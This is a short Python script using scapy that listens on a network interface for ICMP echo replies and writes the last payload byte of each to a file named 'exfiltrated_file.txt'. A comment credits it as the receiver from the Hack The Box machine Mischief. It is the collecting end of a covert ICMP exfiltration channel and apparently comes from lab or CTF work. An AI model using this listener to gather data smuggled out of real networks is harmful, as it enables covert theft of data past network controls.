# Copyright (C) 2025 CEA - All Rights Reserved
# 
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with
# this program.  If not, see <http://www.gnu.org/licenses/>.

from scapy.all import *
import sys

targetIP = sys.argv[1]
interface = sys.argv[2]

open('../exfiltrated_file.txt', 'w').close()

#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    with open('../exfiltrated_file.txt', 'a') as f:
        if pkt.haslayer(ICMP):
            if pkt[ICMP].type == 0:
                data = pkt[ICMP].load[-1:] #Read the 4bytes interesting
                f.write(f"{data.decode('utf-8')}")

sniff(iface=interface, prn=process_packet)